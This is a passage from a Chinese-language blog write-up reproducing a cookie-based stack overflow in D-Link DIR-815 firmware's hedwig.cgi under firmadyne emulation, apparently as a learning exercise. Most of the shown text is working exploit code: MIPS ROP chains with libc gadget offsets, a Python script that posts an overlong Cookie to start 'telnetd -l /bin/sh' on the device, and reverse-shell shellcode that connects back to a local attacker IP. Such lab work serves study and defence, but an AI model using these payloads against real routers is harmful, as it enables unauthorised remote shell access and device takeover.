payload += "xabx0fx02x24x0cx09x09x01"
shellcode = payload
libc_base = 0x77f34000
sleep_offset = 0x56BD0
gadget1 = 0x57E50   
gadget2 = 0x0003E524
gadget3 = 0x0000B814
gadget4 = 0x00037E6C
data = "a"*969
data += "aaaa" #s0
data += p32(libc_base+gadget2) #s1
data += p32(libc_base+sleep_offset) #s2
data += "aaaa" #s3
data += "aaaa" #s4
data += "aaaa" #s5
data += "aaaa" #s6
data += "aaaa" #s7
data += "aaaa" #gp
data += p32(libc_base+gadget1) #ra
data += "b"*0x18
data += "bbbb" #s0
data += p32(libc_base+gadget4) #s1
data += "bbbb" #s2
data += p32(libc_base+gadget3) #ra
data += "c"*0x18
data += shellcode 
f=open("content","wb")
f.write(data)
f.close()
```

执行的结果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e003c9e995e9fc43.png)

##### <a class="reference-link" name="firmadyne%E6%A8%A1%E6%8B%9F"></a>firmadyne模拟

接下来，介绍一下firmadyne的模拟。根据上面，我们已经把firmadyne安装完毕，接下来，我们将固件放在同目录下，然后执行：

```
python fat.py
```

然后输入dir815_v1.00_a86b.bin，还有dlink，接下来，就等待着这个固件的模拟，出现如下的情景，就可以

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01588d8cb43728f154.png)

然后我们通过nmap扫描的话，可以出现下面的场景：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01358ebf03d2aa3267.png)

然后，我们依然用两种方式来展示我们的exp。

1）system的方式：

脚本如下：

```
from pwn import *
import requests
import sys
def get_payload(offset,cmd):
    #libc_base = 0x77f34000
    libc_base = 0x2aaf8000
    system_offset = 0x53200-1
    gadget1 = 0x159cc
    gadget2 = 0x000158C8
    data = "uid=1234"
    data += "a"*offset
    data += p32(libc_base+system_offset) #s0
    data += "aaaa" #s1
    data += "aaaa" #s2
    data += "aaaa" #s3
    data += "aaaa" #s4
    data += p32(libc_base+gadget1) #s5
    data += "aaaa" #s6
    data += "aaaa" #s7
    data += "aaaa" #gp
    data += p32(libc_base+gadget2) #ra
    data += "b"*0x10
    data += cmd
    return data
if __name__=="__main__":
    cmd = "telnetd -l /bin/sh"
    fake_cookie=get_payload(969,cmd)
    #fake_cookie = get_payload3(969)
    header = `{`
        'Cookie'        : fake_cookie,
        'Content-Type'  : 'application/x-www-form-urlencoded',
        'Content-Length': '100'
        `}`
    data = `{`'uid':'1234'`}`
    ip=sys.argv[1]
    url="http://"+ip+"/hedwig.cgi"
    r=requests.post(url=url,headers=header,data=data)
    print r.text
```

说明一下，开始的时候不知道加载地址，然后随便试了几个地址，然后就看到执行成功了。执行之后，我们可以看到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ef00c1d019628ecb.png)

开启了telnet服务，我们可以直接telnet上去，如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010315039ca4eac446.png)

2）shellcode的方式

这个里面，就是把get_payload函数修改为reverse_shell的部分，感觉也是可以的，shellcode如下：

```
def get_payload2(offset):
    payload= "x26x40x08x01"*4
    payload += "xffxffx04x28xa6x0fx02x24x0cx09x09x01x11x11x04x28"
    payload += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    payload += "xa6x0fx02x24x0cx09x09x01xfdxffx0cx24x27x20x80x01"
    payload += "x27x28x80x01xffxffx06x28x57x10x02x24x0cx09x09x01"
    payload += "xffxffx44x30xc9x0fx02x24x0cx09x09x01xc9x0fx02x24"
    payload += "x0cx09x09x01x79x69x05x3cx01xffxa5x34x01x01xa5x20"
    #payload += "xf8xffxa5xafx01xb1x05x3cxc0xa8xa5x34xfcxffxa5xaf"                  # 192.168.1.177
    payload += "xf8xffxa5xafx00x02x05x3cxc0xa8xa5x34xfcxffxa5xaf"                   # 192.168.3.132
    #payload += "xf8xffxa5xafx64xfex05x3cxc0xa8xa5x34xfcxffxa5xaf"                   # 192.168.100.254
    payload += "xf8xffxa5x23xefxffx0cx24x27x30x80x01x4ax10x02x24"
    payload += "x0cx09x09x01x62x69x08x3cx2fx2fx08x35xecxffxa8xaf"
    payload += "x73x68x08x3cx6ex2fx08x35xf0xffxa8xafxffxffx07x28"
    payload += "xf4xffxa7xafxfcxffxa7xafxecxffxa4x23xecxffxa8x23"
    payload += "xf8xffxa8xafxf8xffxa5x23xecxffxbdx27xffxffx06x28"
    payload += "xabx0fx02x24x0cx09x09x01"
    shellcode = payload
    libc_base = 0x2aaf8000
    sleep_offset = 0x56BD0
    gadget1 = 0x57e50
    gadget2 = 0x3e524
    gadget3 = 0x0000B814
    gadget4 = 0x00037E6C
    data='a'*offset
    data+="a"*0x18
    data+="aaaa" #s0
    data+=p32(gadget2+libc_base) #s1
    data+=p32(sleep_offset+libc_base) #s2
    data+="aaaa" #s3
    data+="aaaa" #s4
    data+="aaaa" #s5
    data+="aaaa" #s6
    data+="aaaa" #s7
    data+="aaaa" #fp
    data+=p32(gadget1+libc_base) #ra
    data+="b"*0x18
    data+="bbbb" #s0
    data+=p32(gadget4+libc_base) #s1
    data+="bbbb" #s2
    data+=p32(gadget3+libc_base) #ra
    data+="c"*0x18
    data+=shellcode
    return data
```

但是我们要要返回的地址是192.168.0.2，其中包含了`x00`，所以说没有复现成功，但是应该也是可以的。这里突然有一个疑惑，怎么能修改firmadyne模拟时对于IP地址的设定？



## 总结

终于到了总结的部分啦，这次主要和上次的不同是，1、增加了对cgi程序漏洞的复现，主要是设置环境变量，实际上他们获取参数的过程也是从环境变量中获取；2、实现了用firmadyne进行模拟复现的情况，并且成功利用；3、增加了ghidra的使用，这个对于mips来说还真的挺舒服的。原本计划增加一些命令执行的内容，以及自己的一些关于命令执行的理解，就等下一次的入门到入门吧。ps：希望大佬们能对我文中的疑惑进行解答，谢谢。
